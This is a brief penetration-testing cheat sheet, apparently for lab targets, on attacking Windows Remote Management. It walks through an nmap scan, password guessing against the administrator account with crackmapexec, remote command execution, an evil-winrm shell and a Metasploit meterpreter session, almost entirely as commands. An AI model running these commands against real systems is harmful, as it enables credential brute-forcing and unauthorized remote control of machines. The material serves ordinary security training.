
## Exploiting WinRM (Windows Remote Management) protocol

Remote access to Windows systems via http/https. TCP ports 5985, 5986.

scan the target with nmap. By default, nmap will not scan ports 5985 and 5986.

nmap -sV -p 5985-5986 10.10.10.10

## Using crackmapexec. This tool can also be used for msql, smb, ssh ,rdp, ftp, ldap.

```plaintext
crackmapexec winrm 10.10.10.10 -u administrator -p /usr/share/wordlists...
```

after finding the password, we can use crackmapexec to execute arbitrary commands in target system

```plaintext
crackmapexec winrm 10.10.10.10 -u administrator -p adminpassword -x “whoami”
crackmapexec winrm 10.10.10.10 -u administrator -p adminpassword -x “systeminfo”
```

## Using evil-winrm to obtain a command shell session by powershell

```plaintext
evil-winrm.rb -u administrator -p ‘adminpassword’ -i 10.10.10.10
```

## Using Metasploit to obtain a meterpreter session

```plaintext
msfconsole
search winrm_script_exec
use
options
set RHOSTS 10.10.10.10
set USERNAME administrator
set PASSWORD adminpassword
exploit
```

now we should have a meterpreter session
